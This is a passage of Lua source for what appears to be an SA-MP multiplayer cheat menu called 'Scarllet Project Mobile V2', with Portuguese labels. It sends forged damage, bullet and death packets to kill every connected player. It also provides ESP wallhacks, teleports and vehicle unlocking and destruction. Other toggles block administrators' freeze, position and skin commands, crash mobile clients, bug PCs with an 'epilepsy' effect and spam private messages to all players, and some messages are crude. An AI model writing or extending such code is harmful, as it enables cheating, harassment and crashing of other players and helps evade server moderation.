                                az = pz - 0.7
                            elseif model == 563 then
                                ax = px + 1
                                ay = py
                                az = pz - 0.2
                            end
        
                            foundPlayer = true
                            printStringNow('~b~FUDENDO O JOGADOR~b~: ~b~~h~~h~'..nick..'~b~[~b~~h~~h~'..id..'~b~] | DISTANCIA: ' .. string.format("%.2f", d), 1000)
        
                        else
                            printStringNow('~r~JOGADOR ' .. (id or 'DESCONHECIDO') .. ' NAO ATENDE AOS CRITERIOS OU ESTA FORA DO RAIO.', 2000)
                        end
                    end
                end
        
                if not foundPlayer then
                    printStringNow('~r~NENHUM JOGADOR POR PERTO! ~b~PROCURANDO...', 2000)
                end
        
                if not isCharInAnyHeli(PLAYER_PED) then
                    ebalka = false
                    printStringNow('~r~VOCE SAIU DO HELICOPTERO!', 1500)
                end
            else
                ebalka = false
                printStringNow('~r~VOCE NAO ESTA EM UM HELICOPTERO!', 1500)
            end
        end

        if aim.CheckBox.teste61[0] then
			for iter_2_0 = 0, 250 do
				if sampIsPlayerConnected(iter_2_0) then
					sampSendGiveDamage(iter_2_0, 1833.331542, 4, 3)
					printStringNow("~b~MrX Fucked ID " .. iter_2_0, 100)
					wait(100)
				end
			end
		end
        
        
        if aim.CheckBox.teste46[0] then
            cameraSetLerpFov(mfov[0], mfov[0], 999988888, true)
        else
            cameraSetLerpFov(70.0, 70.0, 999988888, true) 
        end

        if aim.CheckBox.teste41[0] then
            local playerX, playerY, playerZ = getCharCoordinates(PLAYER_PED)
            local x, y = convert3DCoordsToScreen(playerX, playerY, playerZ)
            

            local veh = getAllVehicles()
            for k, v in ipairs(veh) do
                if isCarOnScreen(v) then
                 
                    local carX, carY, carZ = getCarCoordinates(v)
                    local px, py = convert3DCoordsToScreen(carX, carY, carZ)
                    
                  
                    local thickness = 2
                    renderDrawLine(x, y, px, py, thickness, 0xAA0000FF)
                
                    local model = cars[getCarModel(v) - 399] .. ' (' .. tostring(select(2, sampGetVehicleIdByCarHandle(v))) .. ')'
                    local clr, _ = getCarColours(v)
                    local screenX, screenY = convert3DCoordsToScreen(carX, carY, carZ)
                    local length = renderGetFontDrawTextLength(fontwarp, model, true)
                    local height = renderGetFontDrawHeight(fontwarp)
                    local textColor = 0xFFFF0000 
                    
                  
                    if getCarDoorLockStatus(v) == 2 then
                        textColor = 0xFFEC0000
                    end
                    

                    renderFontDrawText(fontwarp, model, screenX - (length + 5 + 18) / 2, screenY - (height + 7 + 14) / 2, textColor, true)
                    
         
                    local doorStatus = getCarDoorLockStatus(v) == 0 and "{00FF00}Veiculo Aberto!" or "{FF0000}Veiculo Fechado!"
                    renderFontDrawText(fontwarp, doorStatus, screenX, screenY, -1)
                    

                    local health = getCarHealth(v)
                    local healthPercent = health / 1000 * 100 
                    

                    local hpText = "HP: " .. math.floor(healthPercent) .. "%"
                    local hpTextLength = renderGetFontDrawTextLength(fontwarp, hpText, true)
                    local hpTextHeight = renderGetFontDrawHeight(fontwarp)
                    local hpTextColor = 0xFFFF0000
                    renderFontDrawText(fontwarp, hpText, screenX - hpTextLength / 2, screenY + (height + 7 - 14) / 2 + 15, hpTextColor, true)
                
                end
            end
        end

        if aim.CheckBox.damagerEnabled[0] then
            local currentTime = os.clock()
            if currentTime >= nextAttackTime then
                local closestPlayerId = getClosestPlayerId()
                if closestPlayerId ~= -1 then
                    local bulletData = samp_create_sync_data("bullet")
                    bulletData.targetType = 1
                    bulletData.targetId = closestPlayerId

                    local camX, camY, camZ = getActiveCameraCoordinates()
                    bulletData.origin.x = camX
                    bulletData.origin.y = camY
                    bulletData.origin.z = camZ

                    bulletData.weaponId = getCurrentCharWeapon(PLAYER_PED)

                    bulletData.send()

                    local targetPlayerName = sampGetPlayerNickname(closestPlayerId)
                    local myPlayerId = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
                    local myPlayerName = sampGetPlayerNickname(myPlayerId)

                    printStringNow(string.format("[~b~DAMAGER] JOGADOR %s (ID: %d) SENDO FUDIDO POR ~g~ %s (ID: %d).", targetPlayerName, closestPlayerId, myPlayerName, myPlayerId), 600)
                else
                    printStringNow("[DAMAGER] NINGUEM FOI ENCONTRADO", 600)
                end

                nextAttackTime = currentTime + (1 / attackSpeed[0]) 
            end
        end

        if aim.CheckBox.teste54[0] then
            espcarlinha()
        end

        if aim.CheckBox.teste67[0] then
            espnomeped()
        end

        if aim.CheckBox.teste58[0] then
            cxnatal()
        end

        if aim.CheckBox.teste68[0] then
            cxouro()
        end

        if aim.CheckBox.teste71[0] then
            cxplatina()
        end

        if aim.CheckBox.teste75[0] then
            cxrp()
        end
        if aim.CheckBox.teste77[0] then
            espcaixa2d()
        end

        if aim.CheckBox.teste76[0] then
            cxprata()
        end

        if aim.CheckBox.teste74[0] then
            cxhallo()
        end

        if aim.CheckBox.teste73[0] then
            rarmas()
        end

        if aim.CheckBox.teste72[0] then
            tesouro()
        end

        if aim.CheckBox.teste70[0] then
            allobj()
        end

        if aim.CheckBox.teste69[0] then
            cxbronze()
        end

        if aim.CheckBox.teste79[0] then
            result, x, y, z = getTargetBlipCoordinates()
      if result then
          if isCharInAnyCar(PLAYER_PED) then
              local _, carId = sampGetVehicleIdByCarHandle(storeCarCharIsInNoSave(PLAYER_PED))
              lua_thread.create(carTeleport, carId, x, y, z)
          else
              teleport = true
              sendAimSync()
          end
  
          sampAddChatMessage("Teleportado com sucesso!", 0x00FF00)

          aim.CheckBox.teste79[0] = false
      end
  end

        if aim.CheckBox.teste78[0] then
            active = not active
    printString("Anexar Reboque: " .. (active and "ON" or "OFF"), 500)
    
    while true do 
        wait(0)
        
        if active and isCharInAnyCar(1) and getDriverOfCar(getCarCharIsUsing(1)) == 1 then 
            local x, y = getScreenResolution()
            local radius = 1000
            x = x / 2 - radius / 2
            y = y / 3.3 - radius / 2
            
           
            renderDrawLine(x, y, x + radius, y, 3, -1)
            renderDrawLine(x, y, x, y + radius + 3, 3, -1)
            renderDrawLine(x, y + radius, x + radius, y + radius, 3, -1)
            renderDrawLine(x + radius, y, x + radius, y + radius, 3, -1)
            
            local vehs = getAllVehicles()
            local clear = true
            
            if #vehs > 0 then
                for i = 1, #vehs do
                    if vehs[i] ~= getCarCharIsUsing(1) then
                        local xx, yy, zz = getCarCoordinates(vehs[i])
                        local xxx, yyy = convert3DCoordsToScreen(xx, yy, zz)
                        local px, py, pz = getCharCoordinates(1)
                        
                        if xxx >= x and xxx <= x + radius and yyy >= y and yyy <= y + radius and isCarOnScreen(vehs[i]) and getDistanceBetweenCoords3d(px, py, pz, xx, yy, zz) <= 20 then
                            renderDrawLine(xxx, yyy, x + radius / 2, y + radius / 2, 3, -1)
                            trailer = vehs[i]
                            clear = false
                            break
                        end
                    end
                end
            end
            
            if clear then
                trailer = nil
            end
        end
        
        local pressed_menu = isWidgetPressed(WIDGET_ARCADE_RESET)
        if isCharInAnyCar(PLAYER_PED) and pressed_menu and trailer ~= nil then
            if isCharInAnyCar(1) and doesVehicleExist(trailer) then
                if isTrailerAttachedToCab(trailer, getCarCharIsUsing(1)) then
                    detachTrailerFromCab(trailer, getCarCharIsUsing(1))
                    trailer = nil
                else
                    attachTrailerToCab(trailer, getCarCharIsUsing(1))
                end
            end
            trailer = nil
        end
    end
end


        if aim.CheckBox.teste56[0] then
            function sampev.onSetPlayerPos()
                return false
            end
        elseif aim.CheckBox.teste56[0] == false then
            function sampev.onSetPlayerPos()
                return true
            end
        end

        if aim.CheckBox.teste64[0] then
            function sampev.onSetPlayerSkin()
                return false
            end
        elseif aim.CheckBox.teste64[0] == false then
            function sampev.onSetPlayerSkin()
                return true
            end
        end   

        if aim.CheckBox.teste60[0] then
            function sampev.onTogglePlayerControllable()
                return false
            end
        elseif aim.CheckBox.teste60[0] == false then
            function sampev.onTogglePlayerControllable()
                return true
            end
        end

        if aim.CheckBox.teste55[0] then
            setCarEngineOn(pCarHandle, true)
        end

        if aim.CheckBox.teste53[0] then
                for k, v in pairs(getAllVehicles()) do
                    local _, id = sampGetVehicleIdByCarHandle(v)
                    if _ then
                        sampSendVehicleDestroyed(id)
                        wait(10)
                    end
                end
            end

        if aim.CheckBox.teste40[0] then
            local x, y, z = getCharCoordinates(PLAYER_PED)
            local succ, veh = findAllRandomVehiclesInSphere(x, y, z, 400, false, false)
            while succ do
                local succ2, v = sampGetVehicleIdByCarHandle(veh)
                if succ2 then unlockVeh(v) end
                succ, veh = findAllRandomVehiclesInSphere(x, y, z, 400, true, false)
            end
            printString('Veiculos destrancados!', 500)
        end


        if aim.CheckBox.teste39[0] then
            local pressed_menu = isWidgetPressed(WIDGET_KISS)
            if pressed_menu and not was_pressed_menu then
                if not chooseActive then wait(200) 
                else removePointMarker() end
                chooseActive = not chooseActive
                printStringNow(chooseActive and "Escolha a posicao" or "Voce cancelou a escolha", 3000)
            end
            was_pressed_menu = pressed_menu
            if tp then
                if getDistanceBetweenCoords3d(blipX, blipY, blipZ, charPosX, charPosY, charPosZ) > 15 then
                    height = blipZ > charPosZ
                    sync = true
                    vectorX = blipX - charPosX
                    vectorY = blipY - charPosY
                    vectorZ = blipZ - charPosZ
                    local vec = Vector3D(vectorX, vectorY, vectorZ)
                    vec:normalize()
                    charPosX = charPosX + vec.x * 5
                    charPosY = charPosY + vec.y * 5
                    charPosZ = charPosZ + vec.z * 2.4
                    
                    if not isCharInAnyCar(PLAYER_PED) then
                        footcoord(charPosX, charPosY, charPosZ)
                        wait(10)
                    else
                        incarcoord(charPosX, charPosY, charPosZ)
                        wait(10)
                    end
                    packets = packets + 1
                    if packets >= 8 then
                        wait(240)
                        packets = 0
                    end
                    local dist = getDistanceBetweenCoords3d(blipX, blipY, blipZ, charPosX, charPosY, charPosZ)
                    if dist > 15 then
                        printStringNow(string.format("%0.2fm", dist), 750)
                    end
                else
                    setCharCoordinates(PLAYER_PED, blipX, blipY, blipZ - 1)
                    tp = false
                    sync = false
                    packets = 0
                end
            end
        end

        if aim.CheckBox.teste35[0] then
            if not isFunctionActive then
                isFunctionActive = true
             
                for iter_2_0 = 0, 250 do
                  
                    if not aim.CheckBox.teste33[0] then
                        isFunctionActive = false
                        break 
                    end
        
                    if sampIsPlayerConnected(iter_2_0) then
                     
                        local msg = ffi.string(messageText)
                     
                        sampSendChat("/pm " .. iter_2_0 .. " " .. msg)
                        printStringNow("~g~Jogadores trollados kk " .. iter_2_0)
                        wait(dsms[0])
                    end
                end
               
                isFunctionActive = false
            end
        else
      
            isFunctionActive = false
        end

        if aim.CheckBox.caixa[0] then
           espvida()
        end
            
        if aim.CheckBox.linha[0] then
           esplinhaped()
        end        
        
        if aim.CheckBox.teste22[0] then
            local car = getCarCharIsUsing(PLAYER_PED)
            
            if isCharInAnyCar(PLAYER_PED) and isWidgetPressed(WIDGET_CRANE_UP) then
                setCarForwardSpeed(car, 0)
            end
        end      

        if aim.CheckBox.teste19[0] then
            local bike = {[481] = true, [509] = true, [510] = true}
            
            if isCharInAnyCar(PLAYER_PED) then
                local var_52_0 = isWidgetPressed(WIDGET_CRANE_UP) 
                if bike[getCarModel(storeCarCharIsInNoSave(PLAYER_PED))] and var_52_0 then
                    local veh = storeCarCharIsInNoSave(PLAYER_PED)
                    local cVecX, cVecY, cVecZ = getCarSpeedVector(veh)
                    if not isCarInAirProper(veh) and cVecZ < 7.0 then
                        applyForceToCar(veh, 0.0, 0.0, 0.44, 0.0, 0.0, 0.0)
                    end
                end
            end
        end 

        if aim.CheckBox.teste16[0] then
            delplayers()
        end

        if aim.CheckBox.teste17[0] then
            setAnimGroupForChar(PLAYER_PED, "PLAYER")
		else
			setAnimGroupForChar(PLAYER_PED, usePlayerAnimGroup and "PLAYER" or isCharMale(PLAYER_PED) and "MAN" or "WOMAN")
		end

        
        if aim.CheckBox.teste15[0] then
            for iter_74_13 = 0, sampGetMaxPlayerId(true) do
                if sampIsPlayerConnected(iter_74_13) then
                    local var_74_50, var_74_51 = sampGetCharHandleBySampPlayerId(iter_74_13)
        
                    if var_74_50 and isCharOnScreen(var_74_51) and not isCharInAnyCar(var_74_51) then
                        local var_74_52 = {
                            getCharCoordinates(PLAYER_PED)
                        }
                        local var_74_53 = {
                            getCharCoordinates(var_74_51)
                        }
        
                        if math.sqrt(math.pow(var_74_53[1] - var_74_52[1], 2) + math.pow(var_74_53[2] - var_74_52[2], 2) + math.pow(var_74_53[3] - var_74_52[3], 2)) < 1 then
                            setCharCollision(var_74_51, false)
                        else
                            setCharCollision(var_74_51, true)
                        end
                    end
                end
            end
        end

        if aim.CheckBox.teste12[0] then
            local id = sampGetMaxPlayerId(false)
            local nearby_players = {}
        
            for player_id = 0, id do
                if sampIsPlayerConnected(player_id) then
                    table.insert(nearby_players, player_id)
                end
            end
        
            if #nearby_players > 0 then
                local random_player_id = nearby_players[math.random(#nearby_players)]
                sampSendDeathByPlayer(random_player_id, 9)
            end
        
            local speed = math.max(1, dchatkill[0]) 
            wait(1000 / speed) 
        end
    
        if aim.CheckBox.teste10[0] then
            function sampev.onPlayerStreamIn(playerId)
                local stream = sampGetPlayerNickname(playerId)
                sampAddChatMessage("Scarllet Project:\nJogador no Stream: " .. stream .. " ", 255, 255, 0)
            end
            function sampev.onPlayerStreamOut(arg_21_0)
                stream = sampGetPlayerNickname(arg_21_0)
                sampAddChatMessage("Scarllet Project:\nJogadores de bosta: " .. stream .. " ", 255, 255, 0)
            end
        elseif aim.CheckBox.teste10[0] == false then
            function sampev.onPlayerStreamIn(arg_22_0)
                return true
            end
        
            function sampev.onPlayerStreamOut(arg_23_0)
                return true
            end
        end
                if aim.CheckBox.teste8[0] then
                    if isCharOnFoot(PLAYER_PED) then
                        sampSetSpecialAction(68)
                    end
                else
                    sampSetSpecialAction(0)
                end

        if aim.CheckBox.teste6[0] then
            if isKeyDown(90) and not sampIsCursorActive() then
                taskPlayAnim(PLAYER_PED, "facsurp", "PED", 9, false, false, false, true, -1)
            elseif isCharPlayingAnim(PLAYER_PED, "facsurp") then
                taskPlayAnim(PLAYER_PED, "facsurpm", "PED", 9, false, false, false, false, -1)
            end
            
            if sampIsChatInputActive() then
                taskPlayAnim(PLAYER_PED, "factalk", "PED", 9, false, false, false, true, -1)
            elseif isCharPlayingAnim(PLAYER_PED, "factalk") then
                taskPlayAnim(PLAYER_PED, "facsurpm", "PED", 9, false, false, false, false, -1)
            end
            
            wait(0)
        end
        

    end
end

local selected_category = "JOGADOR"

local newFrame = imgui.OnFrame(
    function() return aim.renderWindow.renderWindow[0] end,
    function(player)

        local sizeX, sizeY = getScreenResolution()
        imgui.SetNextWindowPos(imgui.ImVec2(sizeX / 2, sizeY / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
        imgui.SetNextWindowSize(imgui.ImVec2(1115, 580), imgui.Cond.FirstUseEver)

        imgui.Begin(faicons('CROWN') .. u8" SCARLLET PROJECT MOBILE V2 " .. faicons('CROWN'), aim.renderWindow.renderWindow, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse)

        local button_width = 128
        local button_height = 50

        local categories = {
            {name = "JOGADOR"},
            {name = "VEICULOS"},
            {name = "ARMAS"},
            {name = "TROLL"},
            {name = "ESP"},
            {name = "SPAMMER"},
            {name = "SILENT"},
            {name = "TELEPORTE"},
        }

        for i, category in ipairs(categories) do
            if i > 1 then imgui.SameLine() end
            if imgui.Button(category.name, imgui.ImVec2(button_width, button_height)) then
                selected_category = category.name
            end
        end
        
        imgui.Separator()
        if selected_category == "JOGADOR" then
            if renderobj == "testeprincipal" then
                local buttonWidth = 200
                local buttonHeight = 40
                imgui.BeginGroup()  
                if imgui.Button("RECONECTAR", imgui.ImVec2(buttonWidth, buttonHeight)) then
                    reconectsamp()
                end     
                imgui.SameLine()
                if imgui.Button("SETAR COLETE", imgui.ImVec2(buttonWidth, buttonHeight)) then
                    if COLETEZ then
                        local data = samp_create_sync_data('player')
                        data.position.x, data.position.y, data.position.z = getCharCoordinates(PLAYER_PED)
                        data.health = getCharHealth(PLAYER_PED)
                        data.armor = 0
                        data.weapon = getCurrentCharWeapon(PLAYER_PED)
                        data.send()
                        damageChar(PLAYER_PED, 0, 100)
                        COLETEZ = false
                    else
                        local data = samp_create_sync_data('player')
                        data.position.x, data.position.y, data.position.z = getCharCoordinates(PLAYER_PED)
                        data.health = getCharHealth(PLAYER_PED)
                        data.armor = 100
                        data.weapon = getCurrentCharWeapon(PLAYER_PED)
                        data.send()
                        addArmourToChar(PLAYER_PED, 100)
                        COLETEZ = true
                    end
                end
                imgui.SameLine()
                if imgui.Button("SETAR VIDA", imgui.ImVec2(buttonWidth, buttonHeight)) then
                    if VIDA_ALTERADA then
                        local data = samp_create_sync_data('player')
                        data.position.x, data.position.y, data.position.z = getCharCoordinates(PLAYER_PED)
                        data.health = getCharHealth(PLAYER_PED)
                        data.armor = getCharArmour(PLAYER_PED) 
                        data.weapon = getCurrentCharWeapon(PLAYER_PED)
                        data.send()
                        setCharHealth(PLAYER_PED, 100)
                        VIDA_ALTERADA = false
                    else
                        local data = samp_create_sync_data('player')
                        data.position.x, data.position.y, data.position.z = getCharCoordinates(PLAYER_PED)
                        data.health = getCharHealth(PLAYER_PED)
                        data.armor = getCharArmour(PLAYER_PED)
                        data.weapon = getCurrentCharWeapon(PLAYER_PED)
                        data.send()
                        setCharHealth(PLAYER_PED, 100)
                        VIDA_ALTERADA = true
                    end
                end
                imgui.SameLine()
                if imgui.Button("Render Obj", imgui.ImVec2(buttonWidth, buttonHeight)) then
                    renderobj = "weapons"
                end
                imgui.EndGroup() 
        
            elseif renderobj == "weapons" then
                if imgui.Button("<-- VOLTAR", imgui.ImVec2(200, 40)) then
                    renderobj = "testeprincipal"
                end
                imgui.BeginGroup()  
                imgui.CustomCheckbox(u8"NATAL", aim.CheckBox.teste58)
                imgui.SameLine(500)
                imgui.CustomCheckbox(u8"OURO", aim.CheckBox.teste68)
                imgui.CustomCheckbox(u8"BRONZE", aim.CheckBox.teste69)
                imgui.SameLine(500)
                imgui.CustomCheckbox(u8"ALL OBJ", aim.CheckBox.teste70)
                imgui.CustomCheckbox(u8"PLATINA", aim.CheckBox.teste71)
                imgui.SameLine(500)
                imgui.CustomCheckbox(u8"TESOURO", aim.CheckBox.teste72)
                imgui.CustomCheckbox(u8"ARMAS", aim.CheckBox.teste73)
                imgui.SameLine(500)
                imgui.CustomCheckbox(u8"RP", aim.CheckBox.teste75)
                imgui.CustomCheckbox(u8"PRATA", aim.CheckBox.teste76)
                imgui.SameLine(500)
                imgui.CustomCheckbox(u8"HALLOWEEN", aim.CheckBox.teste74)
                imgui.CustomCheckbox(u8"OVOS", aim.CheckBox.teste72)
                imgui.EndGroup() 
            end         


            imgui.Separator()
            if aim.CheckBox.teste12[0] then
            imgui.CustomSlider(u8'DELAY CHAT KILL', dchatkill, alse, 1, 100, '%0.1f')
            end
            if aim.CheckBox.teste46[0] then
            imgui.CustomSlider(u8'FOV', mfov, alse, 50, 130, '%0.1f')
            end
            imgui.Text("")
            imgui.CustomCheckbox(u8"ANT STUN", aim.CheckBox.enableAim)
            imgui.SameLine(400)
            imgui.CustomCheckbox(u8"BARRA DE VIDA", aim.CheckBox.teste2)
            imgui.SameLine(710)
            imgui.CustomCheckbox(u8"FICAR ENCIMA DE UM OBJETO", aim.CheckBox.teste4)
            imgui.CustomCheckbox(u8"NO FALL", aim.CheckBox.teste5)
            imgui.SameLine(400)
            imgui.CustomCheckbox(u8"MIJAR", aim.CheckBox.teste8)
            imgui.SameLine(710)
            imgui.CustomCheckbox(u8"JOGADORES NA AREA DE STREAM", aim.CheckBox.teste10)
            imgui.CustomCheckbox(u8"IMUNDAR CHAT KILL", aim.CheckBox.teste12)
            imgui.SameLine(400)
            imgui.CustomCheckbox(u8"FICAR INVISIVEL", aim.CheckBox.teste13)
            imgui.SameLine(710)
            imgui.CustomCheckbox(u8"GOD MOD", aim.CheckBox.teste14)
            imgui.CustomCheckbox(u8"GHOST MODE", aim.CheckBox.teste15)
            imgui.SameLine(400)
            imgui.CustomCheckbox(u8"REMOVER JOGADORES", aim.CheckBox.teste16)
            imgui.SameLine(710)
            imgui.CustomCheckbox(u8"CJ RUN", aim.CheckBox.teste17)
            imgui.CustomCheckbox(u8"LOG DE JOGADORES QUE ENTRARAM", aim.CheckBox.teste38)
            imgui.SameLine(400)
            imgui.CustomCheckbox(u8"DIZER NO CHAT O LOG", aim.CheckBox.teste43)
            imgui.SameLine(710)
            imgui.CustomCheckbox(u8"CLICKWARP", aim.CheckBox.teste39)
            if imgui.CustomCheckbox(u8'ATIVAR SKIN CHANGER', aim.CheckBox.teste42) then
                aim.CheckBox.skinChangerAtivo = aim.CheckBox.teste42[0]
            end
            imgui.SameLine(400)
            if aim.CheckBox.skinChangerAtivo then
                if imgui.Button(u8'PUXAR SKIN') then
                    SetSkin.activate()
                end
                imgui.SameLine()
                imgui.SetNextItemWidth(imgui.GetFontSize() * 7)
                imgui.InputInt(u8'ID DA SKIN', SetSkin.skinid, 1, 50)
            end    
            imgui.CustomCheckbox(u8"ALTERAR FOV", aim.CheckBox.teste46)
            imgui.SameLine(710)
            if imgui.CustomCheckbox(u8"FAKE LAG", aim.CheckBox.teste47) then
                if aim.CheckBox.teste47[0] then
                    sampAddChatMessage("{FF1493}FAKE LAG ATIVADO", -1)
                else
                    sampAddChatMessage("{FF1493}FAKE LAG DESATIVADO", -1)
                end
            end     
            imgui.CustomCheckbox(u8"INVISIVEL SPECTOR", aim.CheckBox.teste52) 
            imgui.SameLine(400)
            if imgui.CustomCheckbox(u8"CRASHAR MOBILES", aim.CheckBox.teste57) then
                toggleCrasher()
            end  
            imgui.SameLine(710)
            imgui.CustomCheckbox(u8"MATAR TODOS", aim.CheckBox.teste61) 
            if imgui.CustomCheckbox(u8"BYPASS INVISIVEL", aim.CheckBox.teste63) then
                fuckinvis = not fuckinvis
                printStringNow(string.format("~b~ FUCK - %s", fuckinvis and "ATIVADO" or "DESATIVADO"), 1000)
            end    
            imgui.SameLine(400)
            local changed = imgui.CustomCheckbox("ATIVAR BAZUKA", bazuka)
            if changed then
                handleBazuka()
            end     
            imgui.SameLine(710)
           if imgui.CustomCheckbox(u8"DEIXAR PCS BUGADOS", aim.CheckBox.teste65) then
            eppc = not eppc 
            sampAddChatMessage(eppc and "{FF99FF}[S-PROJECT]: {0000FF}EPI{33FF00}LEP{FF0000}SIA {33FF00}[Ativado]" or "{FF99FF}[S-PROJECT]: {0000FF}EPI{33FF00}LEP{FF0000}SIA {FF0000}[Desativado]", -1) 
           end
           if imgui.CustomCheckbox(u8"ANIMACAO RETARDADA", aim.CheckBox.teste66) then
            krytka = not krytka
        sampAddChatMessage('{9966FF}[S-PROJECT]: ' .. (krytka and "{0099FF} PED RETARDADO {33FF00}Ativado" or "{0099FF} PED RETARDADO {ff0000} Desativado"), -1)
           end
           imgui.SameLine(400)
            if imgui.CustomCheckbox("AUTO CAIXINHA", autocx) then
                if autocx[0] then
                    sampAddChatMessage("{ffffff}Auto Caixinha {00ff00}Ligado", 3329330)
                else
                    sampAddChatMessage("{ffffff}Auto Caixinha {ff0000}Desligado", 3329330)
                end
            end
            imgui.SameLine(710)
            if imgui.CustomCheckbox("AUTO REGENERAR HP",  aim.CheckBox.autohp) then
                if  aim.CheckBox.autohp[0] then
                    autohpFunction()
                else
                    disableAutohp()
                end
            end
            imgui.Text("")
            imgui.Separator()
            imgui.Text("")
            imgui.CustomCheckbox(u8"ADM NAO PUXAR", aim.CheckBox.teste56)
            imgui.SameLine(700)
            imgui.CustomCheckbox(u8"ADM NAO TIRAR ARMA", aim.CheckBox.teste59)
            imgui.CustomCheckbox(u8"ADM NAO CONGELAR", aim.CheckBox.teste60)
            imgui.SameLine(700)
            imgui.CustomCheckbox(u8"ADM NAO MUDAR SKIN", aim.CheckBox.teste64)
             imgui.Separator()
            imgui.Text("")
            imgui.InputInt(u8"ID DO JOGADOR", playerIdInput)
            imgui.CustomCheckbox(u8"TELEPORTAR PARA O PLAYER", aim.CheckBox.teste51)   
            imgui.Separator()
            imgui.Text("")
        end     
        if selected_category == "ARMAS" then
            imgui.Text("")
            local ammoStr = tostring(aim.CheckBox.ammoAmount[0])
        local bufferSize = #ammoStr + 100
        local buffer = ffi.new("char[?]", bufferSize) 
        ffi.copy(buffer, ammoStr) 

        if imgui.InputText(u8("NUMERO DE MUNICOES"), buffer, bufferSize) then
            aim.CheckBox.ammoAmount[0] = tonumber(ffi.string(buffer)) or 0
        end

        if imgui.Button(u8("PUXAR MUNICAO")) then
            local idgive = getCurrentCharWeapon(PLAYER_PED)
            addAmmoToChar(PLAYER_PED, idgive, aim.CheckBox.ammoAmount[0])
        end

        local weaponIDStr = tostring(aim.CheckBox.weaponID[0])
        local bufferSize = #weaponIDStr + 100
        local buffer = ffi.new("char[?]", bufferSize) 
        ffi.copy(buffer, weaponIDStr) 
        
        if imgui.InputText(u8("ID DA ARMA"), buffer, bufferSize) then
            local newWeaponID = tonumber(ffi.string(buffer))
            if newWeaponID and newWeaponID > 0 then
                aim.CheckBox.weaponID[0] = newWeaponID
            else
                sampAddChatMessage("{ff0000}ID da arma invalido!", 0xFF0000)
            end
        end
        
        if imgui.Button(u8("PUXAR ARMA INSERIDA")) then
            local weaponID = aim.CheckBox.weaponID[0]
            
            local weaponModel = getWeapontypeModel(weaponID)
            if weaponModel == 0 then
                sampAddChatMessage("{ff0000}ID de arma invalido!", 0xFF0000)
            else
                giveGun(weaponID)
            end
        end
        
            if imgui.Button("REMOVER TODAS AS ARMAS") then
                removeAllCharWeapons(PLAYER_PED)
                sampAddChatMessage("TODAS AS ARMAS REMOVIDAS COM SUCESSO.", 16729344)
            end
            
            local weapons = {
                {name = "PUXAR ESPINGARDA", id = 27},
                {name = "PUXAR GRANADA", id = 16},
                {name = "PUXAR MINIGUN", id = 38},
                {name = "PUXAR DESERT", id = 24},
                {name = "PUXAR M4", id = 31},
                {name = "PUXAR SNIPER", id = 34},
                {name = "PUXAR FACA", id = 4},
                {name = "PUXAR DOZE", id = 25},
                {name = "PUXAR AK47", id = 30}
            }
        
            for _, weapon in ipairs(weapons) do
                if imgui.Button(weapon.name) then
                    local weaponModel = getWeapontypeModel(weapon.id)
                    requestModel(weaponModel)
                    removeWeaponFromChar(PLAYER_PED, weapon.id)
                    giveWeaponToChar(PLAYER_PED, weapon.id, 1000)
                end
            end
            
            if imgui.Button("BYPASS ARMAS") then    
                bypass2 = not bypass2
                if bypass2 then
                    sampAddChatMessage("{FF1493} BYPASS ARMAS {00FF00}ATIVADO", -1)
                else
                    sampAddChatMessage("{FF1493} BYPASS ARMAS {FF0000}DESATIVADO", -1)
                end
            end
            if imgui.Button("NAO RESETAR ARMAS") then    
                nresetar = not nresetar
                if nresetar then
                    sampAddChatMessage("{FF1493} NAO RESETAR ARMAS {00FF00}ATIVADO", -1)
                else
                    sampAddChatMessage("{FF1493} NAO RESETAR ARMAS {FF0000}DESATIVADO", -1)
                end
            end  
            imgui.Separator()
            imgui.CustomCheckbox(u8"PUXAR JOGADORES", aim.CheckBox.teste29)
            imgui.CustomSlider(u8'DISTANCIA...', prodist, alse, 0, 500.0, '%0.1f')
            imgui.Separator()
            if imgui.CollapsingHeader(u8("FAKE KILL PERSONALIZADO")) then
                imgui.InputText(u8("ID DO JOGADOR.."), idBuffer, 256)
                imgui.CenterText("ESCOLHA A ARMA!")
                imgui.Separator()
                
                local idStr = ffi.string(idBuffer):gsub("^%s*(.-)%s*$", "%1")
                local id = tonumber(idStr)
                
                local weapons = {
                    {name = u8("DESERT EAGLE"), id = 24},
                    {name = u8("COLT"), id = 22},
                    {name = u8("COLT STEALS"), id = 23},
                    {name = u8("UZI"), id = 28},
                    {name = u8("TEK-9"), id = 32},
                    {name = u8("MP5"), id = 29},
                    {name = u8("RIFLE"), id = 33},
                    {name = u8("SNIPER"), id = 34},
                    {name = u8("M4"), id = 31},
                    {name = u8("AK"), id = 30},
                    {name = u8("MINIGUN"), id = 38},
                    {name = u8("SHOTGUN"), id = 25},
                    {name = u8("SPAS-4"), id = 27},
                    {name = u8("SAWNS OFF"), id = 26},
                    {name = u8("SOCO"), id = 0},
                    {name = u8("DICK"), id = 10},
                    {name = u8("SPRAY"), id = 41}
                }
                
                for _, weapon in ipairs(weapons) do
                    if imgui.Button(weapon.name) then
                        if id then
                            sampSendDeathByPlayer(id, weapon.id)
                        else
                            
                        end
                    end
                end
            end
            
            imgui.Text("")
        end
        if selected_category == "ESP" then
            imgui.Text("")
            imgui.CustomCheckbox(' ESP LINHA', aim.CheckBox.linha)
            imgui.SameLine(700)
            imgui.CustomCheckbox(' ESP ESQUELETO', ESP.enabled_bones)
            imgui.CustomCheckbox(' ESP NOMES', aim.CheckBox.teste67)
            imgui.SameLine(700)
            imgui.CustomCheckbox(' ESP ARMAS', aim.CheckBox.teste30)
            imgui.CustomCheckbox(' ESP VIDA/NOME/COLETE', aim.CheckBox.teste31)
            imgui.SameLine(700)
            imgui.CustomCheckbox(' ESP VEICULOS COMPLETO', aim.CheckBox.teste41)
            imgui.CustomCheckbox(' ESP CAIXA VEICULOS', aim.CheckBox.teste54)
            imgui.SameLine(700)
            imgui.CustomCheckbox(u8"ESP COMPLETO", aim.CheckBox.teste77)
            imgui.CustomCheckbox(u8"ESP ADMINS", aim.CheckBox.teste80)
            imgui.Text("")
            imgui.Separator()
        end
        if selected_category == "SPAMMER" then
            imgui.Text("")
            imgui.CustomCheckbox(' SPAMMER DRILL', aim.CheckBox.teste32)
            imgui.CustomCheckbox(' SPAMMER SCARLLET', aim.CheckBox.teste33)
            imgui.CustomCheckbox( " SPAMMAR NO CHAT", aim.CheckBox.teste34)
            imgui.CustomSlider(u8'DELAY...', dflood, alse, 0, 500.0, '%0.1f')
